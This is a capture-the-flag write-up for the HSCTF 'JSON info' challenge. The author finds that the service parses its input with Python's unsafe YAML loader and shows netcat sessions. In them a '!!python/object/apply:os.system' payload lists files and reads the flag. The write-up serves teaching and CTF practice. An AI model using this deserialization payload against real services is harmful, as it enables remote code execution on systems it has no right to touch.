We are given a challenge server `misc.hsctf.com:9999` which takes in input a json object. That's all we are given.
So, let's give it some random inputs and test it.
```
$ nc misc.hsctf.com 9999
Welcome to JSON info!
Please enter your JSON:
{'test': 'test'}
You have entered: an object
The object has 1 members
Thank you for using JSON info!

$ nc misc.hsctf.com 9999
Welcome to JSON info!
Please enter your JSON:
{\
There was an error: while parsing a flow mapping
  in "<stdin>", line 1, column 1
expected ',' or '}', but got '<stream end>'
  in "<stdin>", line 2, column 1
```
Ah, a python error :) ! Quick google search on the error provided shows that this is a yaml error.

So, yaml module of python. It has been proven long ago that python yaml load can be [exploited](https://www.cvedetails.com/cve/CVE-2017-18342/) for Remote Code Execution.
```
$ nc misc.hsctf.com 9999
Welcome to JSON info!
Please enter your JSON:
{'test': !!python/object/apply:os.system ['ls .']}
bin
boot
dev
etc
flag.txt
home
json_info.py
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
You have entered: an object
The object has 1 members
Thank you for using JSON info!

$ nc misc.hsctf.com 9999
Welcome to JSON info!
Please enter your JSON:
{'test': !!python/object/apply:os.system ['cat flag.txt']}
hsctf{JS0N_or_Y4ML}
You have entered: an object
The object has 1 members
Thank you for using JSON info!
```
